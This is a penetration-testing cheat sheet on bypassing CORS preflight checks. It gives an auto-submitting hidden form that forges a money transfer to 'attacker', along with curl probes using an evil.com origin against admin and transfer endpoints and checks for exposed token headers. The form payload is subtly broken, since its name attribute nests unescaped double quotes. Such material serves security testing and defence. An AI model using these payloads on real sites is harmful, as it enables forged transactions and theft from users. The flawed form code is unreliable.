# Preflight Bypass

## Summary
Bypassing CORS preflight checks by crafting requests that the browser treats as "simple requests" — avoiding the OPTIONS preflight entirely.

## Simple Request Conditions

A request is "simple" (no preflight) when:
- Method is `GET`, `HEAD`, or `POST`
- No custom headers beyond: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- Content-Type is one of: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

## Exploiting Simple Requests

```html
<!-- No preflight — works even if OPTIONS is blocked -->
<form action="https://target.com/api/transfer" method="POST"
      enctype="text/plain" target="hidden">
  <input name="{"to":"attacker","amount":1000}" value="">
</form>
<script>document.forms[0].submit();</script>
```

## Custom Header Preflight Bypass

If the server only validates CORS on OPTIONS but not on GET/POST:

```bash
# Test OPTIONS preflight — may be blocked by WAF
curl -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  https://target.com/api/admin
# Response: 403, no ACA-Origin header

# But the actual GET request may still return ACA-Origin:
curl -H "Origin: https://evil.com" https://target.com/api/admin
# Response: 200 with ACA-Origin: https://evil.com
```

## Content-Type Exploitation

```bash
# If the API only validates CORS for application/json content type
# but allows text/plain without preflight:

# Send JSON as text/plain — still parsable on the server
curl -X POST https://target.com/api/transfer \
  -H "Origin: https://evil.com" \
  -H "Content-Type: text/plain" \
  -d '{"to":"attacker","amount":1000}'

# Some servers parse text/plain as JSON; browser sends no preflight
```

## CORS-Exposed Headers

```bash
# Check for Access-Control-Expose-Headers that leak sensitive data
curl -I -H "Origin: https://evil.com" https://target.com/api
# If X-User-Token, X-CSRF-Token, etc. are exposed,
# JavaScript can read them from the response
```

## Timing-Based Preflight Bypass

```bash
# Some CORS middleware caches preflight results via
# Access-Control-Max-Age — if the endpoint has different CORS
# rules at different times (A/B testing), exploit during permissive window
```

## Testing Checklist

- [ ] OPTIONS preflight returns different CORS headers than GET
- [ ] text/plain content type bypasses CORS validation
- [ ] Cache-based preflight bypass via stale Max-Age
- [ ] Missing preflight for WebSocket upgrades

